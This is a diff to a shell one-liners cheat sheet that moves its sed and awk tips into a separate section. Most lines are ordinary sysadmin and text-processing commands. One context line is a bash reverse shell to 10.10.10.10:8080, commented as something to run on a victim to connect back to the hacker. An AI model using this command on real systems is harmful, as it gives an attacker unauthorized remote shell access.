@@ -164,25 +164,16 @@ ps wu -U someuser # An easy way of selecting the processes owned by someuser.
 (head -5; tail -5) < log # Show the first and last 5 lines of the file 'log'.
 script upgrade.log # script is a nice program that allows you to record your interactive shell session. Great for logging upgrades.
 less -S file.txt # The -S turns off word wrap and allows scrolling to side. Great for logfiles. 
-sed -i 's/^[ \t]*//' somefile # trim leading whitespace
-sed -i 's/^[ \t]*//;s/[ \t]*$//' somefile # Trim leading and trailing whitespace: 
 grep -n alpha $(grep -Irl beta *)   # grep for 'alpha', but only in files that also contain 'beta':
 echo "fuzzbuzz" | sed -e "s/u/i/2" # Replace the second occurrence of a regex match.
 make ; mpg123 hawaii-five-o-theme.mp3 # Play a song at the end of long running command to notify you
 while read line; do echo "line length is ${#line}"; done # While loops are good for reading data from stdin and running processes against it
 find . -mtime +$((365*5)) -maxdepth 1 -exec du -sb {} \; |awk '{s+=$1}END{print s}' # Total bytes used by 5+ year old directories in CWD
-sed ':a;N;$!ba;s/\n/<br \/>/g' # Joins multiple lines and separates them with the string "<br />".
-sed -n '$p;h;n;p;g;p' # Swap each line of input with the next line of input.
-sed '9417q;d' dbdump.sql # Quickly print line 9417 of a large file without processing the whole file.
-sed '/Alice/!d; /Bob/!d' irc.log # Search irc.log for lines containing Alice and Bob regardless of their order in the line.
 cat access_log-*|awk '{print substr($4,5,8)}'|uniq -c|gnuplot -e "set terminal dumb;plot '-' using 1:xtic(2) with boxes" # Web request chart
 man find |sed -e '/./{H;$!d;}' -e 'x;/modified/!d;i==' # In the find man page, show whole paragraphs containing the word modified 
 printf "10^%d\n" {0..20} | bc | sed -e :a -e 's/\(.*[0-9]\)\([0-9]\{3\}\)/\1,\2/;ta' # Add separator commas to long numbers.
-sed -i -e :a -e '/\\$/N; s/\\\n//; ta' script.sh # Unwrap lines that end with a backslash in script.sh
 dmesg -wH # Live dmesg output in human readable format (colors, timing)
-sed -i -e '/^\s*#/!s/$val\>/$pid/g' getproc.pl # Replace all variables $val with $pid in getproc.pl, except on commented lines
 find . -atime -$(date +%j) -type f # Find files you haven't accessed so far this year in a directory. Requires atime attributes.
-sed 's/^/\t/' config.cfg | less # Print config.cfg tab indented to fix a bad console not letting you to see first few columns.
 fdupes -r Pictures > dupes.txt # Find file duplicates in 'Pictures' recursively based on size and mdsum and log them to dupes.txt.
 egrep -oi '#[a-f0-9]{6}' file.css | sort | uniq # extract all unique hex color codes from a CSS file
 for i in {1..20} ; do rig|head -1 |tr A-Z a-z;done |while read f l;do echo ${f:0:1}${l}:$(pwgen 12 1);done # Gen 20 random users/passwords
@@ -193,13 +184,27 @@ pgrep myscript.pl && echo still running || echo "done" | mail admin # Use the &&
 zless, zgrep, zcat, zdiff # There are helper commands for dealing with compressed files (gz, bz2 and xz). They have a z, bz or xz prefix.
 find . -print | sort | sed 's;[^/]*/;|---;g;s;---|; |;g' # Generate output similar to 'tree' without using tree
 ps auxwwf | sed -n -r -e '/^.{64} \//h;/\\/H' -e '/^.{14} [8-9][0-9]\.[0-9]/{x;p}' # Print the high CPU process's family tree.
-sed -i '/^$/N;/\n$/N;//D' notes.txt # Compress consecutive blank lines down to just 2 in the file notes.txt
-awk '{print $1}' data.txt # Print out just the first column (whitespace separated) of data.txt
-awk '{print $7}' access_log | sort | uniq -c | sort -rn | head -100 # Display top 100 files accessed on website.
 iptables -A INPUT -m state --state NEW -m geoip --src-cc CN -j DROP  # Does geolocated/georestricted Firewalls
 identify -format "%f F:%[EXIF:Flash]\n" *.jpg | egrep " F:(0|16|24|32)$" # Show photo filenames where no flash was used. Reqires Imagemagick
 find / \( -path /proc -o -path /sys \) -prune -o -print # Search the file system, but don't descend into the /sys or /proc directories.
 history | awk '{print $2}' | sort | uniq -c | sort -rn | head -10 # Count and show most popular bash_history entries
-
 /bin/bash -i > /dev/tcp/10.10.10.10/8080 0<&1 2>&1   # Reverse shell. Run this on victim IP to connect back to hacker IP
 split --lines=50 foo.txt  # Split a text file into files with 50 lines each
+
+
+# Sed
+sed -i 's/^[ \t]*//' somefile # trim leading whitespace
+sed -i 's/^[ \t]*//;s/[ \t]*$//' somefile # Trim leading and trailing whitespace: 
+sed ':a;N;$!ba;s/\n/<br \/>/g' # Joins multiple lines and separates them with the string "<br />".
+sed -n '$p;h;n;p;g;p' # Swap each line of input with the next line of input.
+sed '9417q;d' dbdump.sql # Quickly print line 9417 of a large file without processing the whole file.
+sed '/Alice/!d; /Bob/!d' irc.log # Search irc.log for lines containing Alice and Bob regardless of their order in the line.
+sed -i -e '/^\s*#/!s/$val\>/$pid/g' getproc.pl # Replace all variables $val with $pid in getproc.pl, except on commented lines
+sed -i -e :a -e '/\\$/N; s/\\\n//; ta' script.sh # Unwrap lines that end with a backslash in script.sh
+sed 's/^/\t/' config.cfg | less # Print config.cfg tab indented to fix a bad console not letting you to see first few columns.
+sed -n '3,7p' somefile  # The sed command p prints. For example, print lines 3 through 7 of a file: 
+sed -i '/^$/N;/\n$/N;//D' notes.txt # Compress consecutive blank lines down to just 2 in the file notes.txt
+
+
+awk '{print $1}' data.txt # Print out just the first column (whitespace separated) of data.txt
+awk '{print $7}' access_log | sort | uniq -c | sort -rn | head -100 # Display top 100 files accessed on website.
